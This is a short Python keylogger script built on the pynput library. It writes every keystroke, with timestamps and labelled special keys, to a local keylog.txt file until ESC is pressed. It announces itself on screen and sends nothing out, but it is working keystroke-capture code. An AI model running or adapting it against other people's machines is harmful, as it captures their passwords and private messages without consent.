import logging
from pynput import keyboard
import datetime
import os

LOG_FILE = "keylog.txt"

log_file_handle = None

def on_press(key):
    global log_file_handle
    try:
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        char_key = str(key).replace("'", "")

        if key == keyboard.Key.space:
            log_entry = "[SPACE]"
        elif key == keyboard.Key.enter:
            log_entry = "[ENTER]\n" 
        elif key == keyboard.Key.tab:
            log_entry = "[TAB]"
        elif key == keyboard.Key.backspace:
            log_entry = "[BACKSPACE]"
        elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            log_entry = "[SHIFT]"
        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            log_entry = "[ALT]"
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            log_entry = "[CTRL]"
        elif key == keyboard.Key.esc:
            log_entry = "[ESC]"
        elif key == keyboard.Key.caps_lock:
            log_entry = "[CAPS_LOCK]"
        elif hasattr(key, 'char'): 
            log_entry = char_key
        else: 
            log_entry = f"[{char_key}]" 

        if log_file_handle:
            log_file_handle.write(f"[{current_time}] {log_entry}")
            log_file_handle.flush() 
        else:
            print("Log file not open. Keystroke not logged.")

    except Exception as e:
        print(f"Error logging key: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        print("\n[ESC] key released. Stopping keylogger.")
        return False 

def start_keylogger():
   
    global log_file_handle
    print("\nBasic Keystroke Logger")
    print(f"Keystrokes will be logged to: {os.path.abspath(LOG_FILE)}")
    print("Press [ESC] key to stop the keylogger.")
    print("\nSTARTING KEYLOGGER")

    try:
        # Open log file in append mode
        log_file_handle = open(LOG_FILE, "a", encoding="utf-8")
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

    except PermissionError:
        print(f"\nERROR: Permission denied to write to '{LOG_FILE}'.")
        print("Please ensure you have write access to the directory, or run as administrator/root.")
    except Exception as e:
        print(f"\nAn error occurred: {e}")
        print("Ensure you have the necessary permissions to capture keystrokes on your OS.")
        print("On macOS, grant 'Accessibility' permissions to your terminal/IDE.")
        print("On Windows/Linux, try running as Administrator/root.")
    finally:
        if log_file_handle:
            log_file_handle.close()
            print(f"Keylogger stopped. Log saved to '{LOG_FILE}'.")


if __name__ == "__main__":
    start_keylogger()